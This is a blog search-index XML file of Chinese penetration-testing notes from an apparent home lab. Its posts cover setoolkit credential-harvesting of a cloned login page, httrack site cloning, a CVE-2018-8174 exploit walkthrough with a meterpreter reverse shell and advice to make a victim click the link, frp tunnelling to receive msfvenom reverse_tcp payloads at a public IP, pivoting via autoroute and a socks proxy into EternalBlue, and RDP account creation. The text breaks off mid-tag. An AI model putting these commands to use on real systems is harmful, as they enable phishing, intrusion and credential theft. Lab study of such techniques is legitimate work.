<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2021/07/22/httrack/"/>
      <url>/2021/07/22/httrack/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>setoolkit做钓鱼网站</title>
      <link href="/2021/07/22/Linux%E5%AD%A6%E4%B9%A0/kali/setoolkit/"/>
      <url>/2021/07/22/Linux%E5%AD%A6%E4%B9%A0/kali/setoolkit/</url>
      
        <content type="html"><![CDATA[<p>setoolkit是个社工工具</p><p> Select from the menu:</p><ol><li><p>Social-Engineering Attacks 社会工程攻击</p></li><li><p>Penetration Testing (Fast-Track) 渗透测试(快速通道)</p></li><li><p>Third Party Modules 第三方模块</p></li><li><p>Update the Social-Engineer Toolkit 更新社会工程师工具包</p></li><li><p>Update SET configuration 更新set设置</p></li><li><p>Help, Credits, and About 帮助，积分和关于</p></li><li><p>Exit the Social-Engineer Toolkit 退出</p></li></ol><p>我们选1</p><ol><li>Spear-Phishing Attack Vectors 钓鱼攻击载体<ol start="2"><li>Website Attack Vectors 网站攻击载体</li><li>Infectious Media Generator  传染性媒体生成器</li><li>Create a Payload and Listener 创建一个有效载荷和听众</li><li>Mass Mailer Attack 邮件群发攻击</li><li>Arduino-Based Attack Vector 基于Arduino的攻击载体</li><li>Wireless Access Point Attack Vector 无线接入点攻击载体</li><li>QRCode Generator Attack Vector QRC代码生成器攻击向量</li><li>Powershell Attack Vectors Powershell攻击载体</li></ol></li><li>Third Party Modules 第三方模块</li></ol><p>我们选2</p><ol><li>Java Applet Attack Method</li><li>Metasploit Browser Exploit Method</li><li>Credential Harvester Attack Method</li><li>Tabnabbing Attack Method</li><li>Web Jacking Attack Method</li><li>Multi-Attack Web Method</li><li>HTA Attack Method</li></ol><p>我们选3</p><ol><li>Web Templates</li><li>Site Cloner</li><li>Custom Import</li></ol><p>我们选2</p><p>监听为本机 直接回车</p><p>输入要监听的网站</p><p><a href="http://192.168.3.27/dvwa">http://192.168.3.27/dvwa</a></p><p>访问192.168.3.24</p><p>可以看到DVWA页面输入密码发现又出现同样的页面其实域名已经变了再输入一次</p><p>返回setoolkit发现已经得到了账号密码</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/setoolkit/s1.png"></p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>httrack克隆网站</title>
      <link href="/2021/07/22/Linux%E5%AD%A6%E4%B9%A0/kali/httrack/"/>
      <url>/2021/07/22/Linux%E5%AD%A6%E4%B9%A0/kali/httrack/</url>
      
        <content type="html"><![CDATA[<p>httrack可以克隆网站，将目标网站所有页面复制一份，httrack是专门针对web应用程序服务器进行探测，拷贝目标服务器到本地的主要作用是在探测尽量减少与目标主机产生交互</p><p>以下是具体操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Welcome to HTTrack Website Copier (Offline Browser) 3.49-2+libhtsjava.so.2</span><br><span class="line">Copyright (C) 1998-2017 Xavier Roche and other contributors</span><br><span class="line">To see the option list, enter a blank line or try httrack --help</span><br><span class="line"></span><br><span class="line">Enter project name :dvwa</span><br><span class="line"></span><br><span class="line">Base path (return=/root/websites/) :/root/dvwa </span><br><span class="line"></span><br><span class="line">Enter URLs (separated by commas or blank spaces) :http://192.168.3.27/dvwa</span><br><span class="line"></span><br><span class="line">Action:</span><br><span class="line">(enter) 1       Mirror Web Site(s) # 镜像网站</span><br><span class="line">        2       Mirror Web Site(s) with Wizard # 镜像网站 向导型</span><br><span class="line">        3       Just Get Files Indicated #指定镜像</span><br><span class="line">        4       Mirror ALL links in URLs (Multiple Mirror) # 镜像URL所有链接</span><br><span class="line">        5       Test Links In URLs (Bookmark Test) # 测试URL的所有链接</span><br><span class="line">        0       Quit</span><br><span class="line">: 2</span><br><span class="line"></span><br><span class="line">Proxy (return=none) :</span><br><span class="line"></span><br><span class="line">You can define wildcards, like: -*.gif +www.*.com/*.zip -*img_*.zip</span><br><span class="line">Wildcards (return=none) :*</span><br><span class="line"></span><br><span class="line">You can define additional options, such as recurse level (-r&lt;number&gt;), separated by blank spaces</span><br><span class="line">To see the option list, type help</span><br><span class="line">Additional options (return=none) :</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Wizard <span class="built_in">command</span> line: httrack http://192.168.3.27/dvwa -W -O <span class="string">&quot;/root/dvwa/dvwa&quot;</span>  -%v  *</span></span><br><span class="line"></span><br><span class="line">Ready to launch the mirror? (Y/n) :y</span><br><span class="line"></span><br><span class="line">WARNING! You are running this program as root!</span><br><span class="line">It might be a good idea to run as a different user</span><br><span class="line">Mirror launched on Thu, 22 Jul 2021 23:56:17 by HTTrack Website Copier/3.49-2+libhtsjava.so.2 [XR&amp;CO&#x27;2014]</span><br><span class="line">mirroring http://192.168.3.27/dvwa * with the wizard help..</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-8174 漏洞复现</title>
      <link href="/2021/07/22/web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/07/22/web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="利用0DAY漏洞CVE-2018-8174获取shell"><a href="#利用0DAY漏洞CVE-2018-8174获取shell" class="headerlink" title="利用0DAY漏洞CVE-2018-8174获取shell"></a>利用0DAY漏洞CVE-2018-8174获取shell</h1><p>CVE 2018 8174 漏洞影响最新版本的 IE 浏览器及使用了 IE 内核的应用程序。用户在浏览网页或打开 Office 文档时都可能中招，最终被黑客植入后门木马完全控制电脑。微软在 2 018 年 4 月 20 日早上确认此漏洞，并于 2018 年 5 月 8 号发布了官方安全补丁，对该 0day 漏洞进行了修复，并将其命名为CVE-2018-8174</p><p>上传CVE-2018-8174_EXP master.zip</p><p>unzip CVE-2018-8174_EXP master.zip</p><p>cd</p><p>python CVE-2018-8174.py -u <a href="http://192.168.3.24/exploit.html">http://192.168.3.24/exploit.html</a> -o hack.rtf -i 192.168.3.24 -p 4444</p><p><code>-u url地址  -o生成文档 -i监听地址 -p 监听端口</code></p><p>cp exploit.html /var/www/</p><p>启动万能的msf</p><blockquote><p>use exploit/multi/handler</p><p>exploit(multi/handler) &gt; set payload w indows/shell/reverse_tcp</p><p>run</p></blockquote><p>让受害者点击恶意链接</p><p><a href="http://192.168.3.24/exploit.html">http://192.168.3.24/exploit.html</a></p><p>获得最高权限</p><p>好水……</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> msf </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp内网穿透</title>
      <link href="/2021/07/21/web%E5%AE%89%E5%85%A8/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>/2021/07/21/web%E5%AE%89%E5%85%A8/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-内网发布服务在公网访问"><a href="#1-内网发布服务在公网访问" class="headerlink" title="1.内网发布服务在公网访问"></a>1.内网发布服务在公网访问</h1><h2 id="服务器对外发布服务原理"><a href="#服务器对外发布服务原理" class="headerlink" title="服务器对外发布服务原理"></a>服务器对外发布服务原理</h2><p>内网主机是用一个ip进行上网的，那么如何让互联网其他主机访问我的内网主机呢？</p><p>分析NET工作过程可以得知整个过程进行两次ip地址转换。</p><p>第一次请求包的源ip地址源地址转化称为SNAT<code>其中S表示source|源 </code>。</p><p>第二次转换答应包的目的地址也被称为目的地址转换DNAT<code>D表示Destination|目的地</code>，DNAT转换可以使互联网访问到内网的主机,单独配置DNAT就可以实现访问内网主机啦！</p><p><strong>通过端口映射发布服务的方式：</strong></p><p>端口映射是比较灵活的映射内网各个不同主机的方式，需要对外发布的服务端口，端口映射的配置方式也比较简单，一般情况可通过路由器配置，但是通过路由器配置端口映射需要有一个前提条件，就是你路由器能够拥有一个公网IP，按正常逻辑来说我们路由器拨号成功后运营商会分配一个公网IP给路由器，但是对于运营商来说这样对IPv4的资源也是种负担，如果每个人都有一个公网IP ，那么国内的IPv4资源将会非常紧张，我 国总计约有 3 亿个IPv4地址，而我国网民何止3亿。所以运营商会在路由器拨号中再嵌套一层内网，也就是说我们路由器拨号得到的IP地址也是一个内网地址，然后由运营商的路由网关再做NAT地址转换进行上网。</p><p>查看是否有公网地址 登录网关查看WAN IP地址</p><p>我家里不是 枯了</p><p><strong>下面操作只是理论没有实操</strong></p><p>查看kali的Mac地址</p><p><strong>添加映射规则：</strong><br>端口，这里不推荐大家在外部端口使用 8 0 端口，因为默认运营商会封杀 8 0 端口，建议使用 1 000 以上<br>的端口号。</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/net/frp/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/f1.png"></p><p>访问公网地址+端口号</p><p>这样我们就能用公网访问内网啦</p><h2 id="无公网IP配置端口映射"><a href="#无公网IP配置端口映射" class="headerlink" title="无公网IP配置端口映射"></a>无公网IP配置端口映射</h2><p>这需要借助第三方服务花生壳</p><p>但要买域名</p><p>终止</p><h1 id="2-Frp搭建内网穿透服务器"><a href="#2-Frp搭建内网穿透服务器" class="headerlink" title="2.Frp搭建内网穿透服务器"></a>2.Frp搭建内网穿透服务器</h1><h2 id="2-1-内网穿透的使用场景"><a href="#2-1-内网穿透的使用场景" class="headerlink" title="2.1.内网穿透的使用场景"></a>2.1.内网穿透的使用场景</h2><p>内网穿透从本质上来讲也是端口映射，两者都是将内网地址映射到公网可访问的地址，而区别是端口映射直接在路由器中配置即可，而内网穿透配置的端口映射则需要客户端和服务端进行绑定后实现，相当于客户端和服务端之间建立了一条隧道，然后访问服务端的请求会通过隧道转发给内网主机，该情况多用于没有公网IP的情况下使用。</p><h2 id="2-2安装配置-frp-服务器映射内网-SSH-服务"><a href="#2-2安装配置-frp-服务器映射内网-SSH-服务" class="headerlink" title="2.2安装配置 frp 服务器映射内网 SSH 服务"></a>2.2安装配置 frp 服务器映射内网 SSH 服务</h2><p>需要台服务器</p><p>下载frp_amd64.tar.gz</p><p>tar xf frp_0.37.0_linux_amd64.tar.gz</p><p>frpc  客户端程序<br>frpc_full.ini  客户端完整配置文件<br>frpc.ini  客户端简易配置文件<br>frps  服务端程序<br>frps _full.ini 服务端完整配置文件<br>frps .ini 服务端简易配置文件</p><p>启动服务端<br>查看配置文件内容。仅配置了侦听端口7000 ，这是服务端和客户端通讯的端口。</p><p>[common]<br>bind_port = 7000</p><p>./frps -c ./frps.ini</p><p>在本地 kali 启动客户端<br>tar xf frp_0.37.0_linux_amd64.tar.gz</p><p>cd frp_0.37.0_linux_amd64/</p><p>vim frpc.ini<br>[common]<br>server_addr = xxx 修改 server 地址为云主机公网 I P<br>server_port = 7000<br>[ssh]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 22<br>remote_port = 6000</p><p>common配置指定了服务端 I P 地址和端口，这样客户端可以和服务端之间建立通讯。<br>ssh配置中指定了协议为 tcp ，本地 IP 127.0.0.1 本地端口： 22 ，映射到服务端端口 6 000如果配置成功访问云主机公网 IP 的 6000 端口表示远程登录到我们内网 kali 主机 22 端口。</p><p>./frps -c ./frps.ini</p><p>成功后查看server端日志</p><p>发现已经可以监听到6000</p><p>ssh连接公网ip6000</p><p># ssh root@ip_addr -p6000</p><p>我们是以127.0.0.1登录的ssh服务 查看</p><p>w</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[ssh客户端]</span><br><span class="line">A--&gt;A1[ssh网关]</span><br><span class="line">A1--&gt;A2[Frp服务器]</span><br><span class="line">A2--&gt;A3[Frp客户端]</span><br><span class="line">A3--&gt;A4[内网ssh服务]</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>SSH 客户端访问公网将自己的 SIP 转换为公网 I P</p></li><li><p>FRP 服务器收到访问代理端口的请求，将 DIP 转换为后端服务器 I P 地址。</p></li><li><p> FRP 客户端收到来自服务器的流量将 S IP 转换为 127.0.0.1</p></li><li><p>内网主机收到来自 FRP 客户端的 S SH 登录请求。登录 127.0.0.1</p></li></ol><p>注： SIP表示源地址，DIP表示目的地址，DPORT表示目标端口</p><h3 id="拓：映射局域网内其他主机服务"><a href="#拓：映射局域网内其他主机服务" class="headerlink" title="拓：映射局域网内其他主机服务"></a>拓：映射局域网内其他主机服务</h3><p>修改local_ip为内网其他主机</p><p>local_ip = 192.168.3.26</p><p>重新启动客户端</p><p>./frpc -c frpc.ini</p><p>ssh <a href="mailto:&#117;&#x62;&#117;&#110;&#x74;&#117;&#x40;&#x38;&#x32;&#x2e;&#x31;&#53;&#55;&#x2e;&#x31;&#x37;&#52;&#46;&#50;&#50;&#x36;">&#117;&#x62;&#117;&#110;&#x74;&#117;&#x40;&#x38;&#x32;&#x2e;&#x31;&#53;&#55;&#x2e;&#x31;&#x37;&#52;&#46;&#50;&#50;&#x36;</a> -p6000</p><p>这时会报错因为ssh服务以为我们连接的是同一台机子，这时删除known_hosts</p><p>remove with</p><p># ssh-keygen -f “/root/.ssh/known_hosts” -R “[82.157.174.226]:6000”</p><p>ssh <a href="mailto:&#x75;&#98;&#117;&#110;&#116;&#117;&#64;&#56;&#x32;&#x2e;&#49;&#53;&#x37;&#x2e;&#x31;&#55;&#x34;&#x2e;&#x32;&#x32;&#x36;">&#x75;&#98;&#117;&#110;&#116;&#117;&#64;&#56;&#x32;&#x2e;&#49;&#53;&#x37;&#x2e;&#x31;&#55;&#x34;&#x2e;&#x32;&#x32;&#x36;</a> -p6000</p><p>w #查看服务</p><h3 id="配置frp仪表盘和认证"><a href="#配置frp仪表盘和认证" class="headerlink" title="配置frp仪表盘和认证"></a>配置frp仪表盘和认证</h3><p>我们前面启动服务端仅配置了侦听端口，实际上frp 服务端有很多配置参数，比如 frp 可以提供web 界面查看所有访问请求的详细信息。以及服务端和客户连接时进行认证，否则其他人都可以映射到你的 frp 服务器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vim frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">vhost_http_port = 80 #虚拟主机端口，如果要发布 web 服务则需配置该项。</span><br><span class="line">dashboard_port = 7500 #仪表盘端口</span><br><span class="line">dashboard_user = admin#仪表盘用户名</span><br><span class="line">dashboard_pwd = 123456 #仪表盘密码</span><br><span class="line">authentication_method = token #认证使用 token</span><br><span class="line">token = admin123456 #token</span><br><span class="line">配置文件必须删除中文注释</span><br></pre></td></tr></table></figure><p>启动服务端 | 服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line">/frp_0.37.0_linux_amd64</span><br><span class="line">vim frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr =82.157.174.226</span><br><span class="line">server_port = 7000</span><br><span class="line">token = admin123456 #配置 token 必须和 server 一致</span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.3.26</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000</span><br><span class="line">[web]</span><br><span class="line">type = http # 协议 http</span><br><span class="line">local_port = 80 #本地端口</span><br><span class="line">custom_domains = domain name #指定域名， web 服务需要域名访问才可以。</span><br></pre></td></tr></table></figure><p>启动客户端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line">配置DNS解析，如果是实际场景可以在域名解析中将域名解析到 V PS 服务器即可。</span><br><span class="line">HOSTS文件： C:\Windows\System32\drivers\etc\hosts 添加行</span><br><span class="line">149.129.65.126 domain name</span><br></pre></td></tr></table></figure><p>访问web服务 <a href="http://domain_name/">http://domain_name/</a></p><p>访问仪表盘用户名：admin 密码： 123456</p><p>仪表板功能比较简洁，就是一些基础配置信息以及访问请求图标。</p><h1 id="kali配置MSF接收来自公网的shell"><a href="#kali配置MSF接收来自公网的shell" class="headerlink" title="kali配置MSF接收来自公网的shell"></a>kali配置MSF接收来自公网的shell</h1><p>服务端配置文件不用改变，我们修改客户端配置文件即可。</p><p>在kali中配置</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">vim frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 82.157.174.226</span><br><span class="line">server_port = 7000</span><br><span class="line"><span class="meta">#</span><span class="bash">authentication_method = token</span></span><br><span class="line">token = admin123456</span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.3.26</span><br><span class="line">local_port = 22</span><br><span class="line">[web]</span><br><span class="line">type = http</span><br><span class="line">local_port = 80</span><br><span class="line">custom_domains = domain_name</span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_port = 4444</span><br><span class="line">local_ip = 192.168.3.26</span><br><span class="line">remote_port = 8000</span><br></pre></td></tr></table></figure><p>添加MSF映射配置即可，协议 tcp 本地端口： 4444 本地 ip 192.168.3.26 映射端口 8000</p><p>生成<br>payload ,LHOST 指定为公网 IP LPORT 指定为公网映射端口。<br>msfvenom -a x64 –platform linux -p linux/x64/ me terpreter /reverse_tcp LHOST=82.157.174.226 LPORT= 8000 -b “\x00” -f elf -o test</p><p>复制到Ubuntu上</p><p>scp test <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x33;&#x2e;&#x32;&#54;">&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x33;&#x2e;&#x32;&#54;</a>:/root/</p><p>启动MSF 并配置侦听<br>use exploit/multi/handler<br>exploit(multi/handler) &gt; set payload linux/x64/ me terpreter/reverse_tcp<br>exploit(multi/handler) &gt; set LHOST 192.168.3.24<br>exploit(multi/handler) &gt; set LPORT 4444<br>exploit(multi/handler) &gt; exploit</p><p>LHOST 和 LPORT 要和 frpc.ini 配置文件中的 local_ip 和 local_port 一致。</p><p>在Ubuntu26上执行命令</p><p>chmod +x test</p><p>./test</p><p>MSF 成功接收 shell</p><h1 id="跨网段获取内网shell"><a href="#跨网段获取内网shell" class="headerlink" title="跨网段获取内网shell"></a>跨网段获取内网shell</h1><h2 id="使用-MSF-自带代理功能实现内网渗透"><a href="#使用-MSF-自带代理功能实现内网渗透" class="headerlink" title="使用 MSF 自带代理功能实现内网渗透"></a>使用 MSF 自带代理功能实现内网渗透</h2><p>当前实验的前提是已经通过<br>MSF 获取到内网 shell ，就比如内网对外网发布 web 服务，我们通过web 服务获取 shell ，然后通过 web 主机对内网进行渗透。</p><p>环境拓扑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A(kali:192.168.3.24)</span><br><span class="line">B(内部部接口: 192.168.88.26)</span><br><span class="line">A--&gt;A1(外部接口: 192.168.3.26)</span><br><span class="line">B--&gt;B1(内网主机win7: 192.168.88.28)</span><br></pre></td></tr></table></figure><p>环境说明：<br>DMZ 主机可以是 Win 也可以是 Linux 。区别在于 win 7 可以通过 MS17 010 获取shell Linux 则推荐生成 payload 直接运行，本环境使用 Linux 。<br>Kali主机网络模式：桥接<br>DMZ 主机网络模式：桥接 仅主机<br>内网主机Win7 网络模式：仅主机</p><p>msfvenom -a x64 –platform linux -p linux/x64/ me terpreter /reverse_tcp LHOST=82.157.174.226 LPORT= 8000 -b “\x00” -f elf -o test</p><p>scp test <a href="mailto:&#x72;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#51;&#46;&#x32;&#x36;">&#x72;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#51;&#46;&#x32;&#x36;</a>:/root/</p><p>配置侦听：<br>msfdb run</p><blockquote><p>use exploit/multi/handler<br>exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp<br>exploit(multi/handler) &gt; set LHOST 192.168.1.53<br>exploit(multi/handler) &gt; set LPORT 4444<br>exploit(multi/handler) &gt; exploit</p></blockquote><p>获取内网网段<br>meterpreter &gt; run get_local_subnets<br>Local subnet: 192.168.3.0/255.255.255.0</p><p>Local subnet:<br>192.168.88.0 /255.255.255.0<br>配置路由，通过配置路由可以让我们Kali 主机访问目标网络。<br>meterpreter &gt; run autoroute -s 192.168.88.0/24</p><p>查看路由信息</p><p>run autoroute -p</p><p>查看arp缓存可以帮助我们快速获取与该主机通讯过的内网主机信息。</p><p>meterpreter &gt; arp</p><p>如果ARP 没有获取有用的信息也无所谓，可以通过配置代理后对内网扫描。</p><p>配置socks 代理<br>meterpreter &gt; background<br>exploit(multi/handler) &gt; use auxiliary/server/socks_proxy<br>auxiliary( server/socks_proxy ) &gt; set srvhost 192.168.3.24<br>auxiliary( server/socks_proxy ) &gt; run</p><p>#vim /etc/proxychains4.conf</p><p>注释掉第<br>52 行<br>52 #proxy_dns<br>文件默认修改最后一行为我们刚刚设置的代理，默认的代理地址是暗网代理。<br>socks 5 192.168.3.24 1080</p><p>通过代理扫描内网。<br>proxychains 4 nmap -Pn -sT -p 445 –script=smb-vuln-ms17-010.nse 192.168.88.0/24</p><p>-Pn ：扫描主机检测是否受到数据包过滤软件或防火墙的保护。<br>-sT ：扫描 TCP 数据包已建立的连接 connect</p><p>通过代理启动msf<br>proxychains 4 msfdb run</p><blockquote><p>use exploit/windows/smb/ms17_010_eternalblue<br>我们使用代理访问内网所以<br>payload 选择 bind 模式。<br>msf6<br>explo it(windows/smb/ms17_010_eternalblue) &gt; set payload<br>windows/x64/meterpreter/bind_tcp<br>msf6<br>exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.88.28<br>msf6<br>exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 9988<br>msf6<br>exploit(windows/smb/ms17_010_ eternalblue) &gt; run<br>注：MSF 的代理功能并不是很稳定，如果执行失败可重复执行。 若是重复无果，可放弃使用 M SF 代<br>理，选择 Frp 搭建内网代理。</p></blockquote><p>开启RDP 远程桌面<br>meterpreter &gt; run post/windows/manage/enable_rdp<br>创建远程桌面用户<br>meterpreter &gt; run<br>post/windows/manage/enable_rdp USERNAME=admin<br>PASSWORD=123456</p><p>映射内网主机远程桌面端口到kali</p><p>meterpreter &gt; portfwd add L 192.168.1.53 l 2323 p 3389 r 192.168.88.57</p><p>kali通过远程桌面登录内网主机<br>rdesktop u xuegod p 123456 192.168.3.24:2323<br>物理机通过远程桌面连接内网主机<br>Win+R 运行： mstsc</p><p>win10远程连接 账号密码</p><h2 id="通过-Frp-内网穿透来实现内网渗透"><a href="#通过-Frp-内网穿透来实现内网渗透" class="headerlink" title="通过 Frp 内网穿透来实现内网渗透"></a>通过 Frp 内网穿透来实现内网渗透</h2><p>配置frp服务器</p><p>vim frps.ini</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[commom]</span><br><span class="line">bind_port = 7000</span><br><span class="line">authentication_method = token</span><br><span class="line">token = admin123456</span><br></pre></td></tr></table></figure><p>启动服务端</p><p>0.33.0_linux_amd64# ./frps c frps.ini</p><p>暂停 与上面类似</p>]]></content>
      
      
      <categories>
          
          <category> 内网穿透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Metasploit信息搜集</title>
      <link href="/2021/07/17/Linux%E5%AD%A6%E4%B9%A0/kali/msf%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2021/07/17/Linux%E5%AD%A6%E4%B9%A0/kali/msf%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>发现目标网段的存活主机:</p><p>我们可以利用auxiliary这个模块来获取目标网端的信息，包括端口开放情况、主机存活情况。</p><blockquote><p>auxiliary/scanner/discovery/arp_sweep</p><p>auxiliary/scancer/smb/smb_version 存活的445主机</p><p>auxiliary/scanner/portscan/syn  端口扫描</p><p>auxiliary/scanner/telnet/telnet_version telent服务扫描</p><p>auxiliary/scanner/rdp/rdp_scanner 远程桌面服务扫描</p><p>auxiliary/scanner/ssh/ssh_version ssh主机扫描</p></blockquote><p>一般情况下我们在渗透测试的时候，如果在不知道资产的情况下，我们会把<strong>整个网端进行扫描存活主机</strong>，然后再<strong>对存活的信息收集信息</strong>，这样的话就可以缩短我们的渗透测试时间，而不盲目的去测试，有时候盲目信息收集会导致后期渗透的道路都是弯的，达不到预期的效果。</p><p>不管是端口扫描还是探测存活主机，都是要设置目标IP地址set rhosts ip地址，如果扫描整个网段的话，最后设置一下线程：set thread 线程数(根据情况设置)。</p><p>执行run命令开始扫描网段的存活主机，发现有服务器存活，这样的话我们就可以对这些存活主机进行下一步的信息收集，比如22、445、3389等敏感端口开放情况探测，在这里需要说明一下，以小白的渗透测试经验，一般我先不扫描整个网端，因为这样对目标主机有损耗，可以直接扫描有溢出漏洞的高危端口，如果有的话，那么就可以通过溢出进行提权，这样的方法也是一种捷径。相反的情况下，如果全端口扫描的话建议用nmap工具。</p><p>kali有自己的密码，内置密码表的地址：/usr/share/wordlists/metasploit/</p><p>一般爆破的话我们可以对ssh、mysql、sql、Oracle、vnc、telnet等常用的端口</p><blockquote><p>1）auxiliary/scanner/mysql/mysql_login</p><p>2）auxiliary/scanner/mssql/mssql_login</p><p>3）auxiliary/scanner/ssh/ssh_login</p></blockquote><h1 id="tcp协议的信息搜集"><a href="#tcp协议的信息搜集" class="headerlink" title="tcp协议的信息搜集"></a>tcp协议的信息搜集</h1><h2 id="使用nmap和arp-sweep搜集信息"><a href="#使用nmap和arp-sweep搜集信息" class="headerlink" title="使用nmap和arp_sweep搜集信息"></a>使用nmap和arp_sweep搜集信息</h2><p>#msfconsole</p><p>msf6 &gt; db_nmap -sV 192.168.3.1</p><p>ARP 扫描</p><p>msf6 &gt; use auxiliary/scanner/discovery/arp_sweep</p><p>查看需要哪些参数</p><p>show options</p><p>配置RHOSTS 扫描的目标网络</p><p>set RHOSTS 192.168.3.0/24</p><p>SHOST 和 SMAC 是伪造的IP 和MAC地址使用的</p><p>配置线程数</p><p>set THREADS 30</p><p>run</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf1.png" alt="结果"></p><h2 id="使用半连接方式扫描TCP"><a href="#使用半连接方式扫描TCP" class="headerlink" title="使用半连接方式扫描TCP"></a>使用半连接方式扫描TCP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 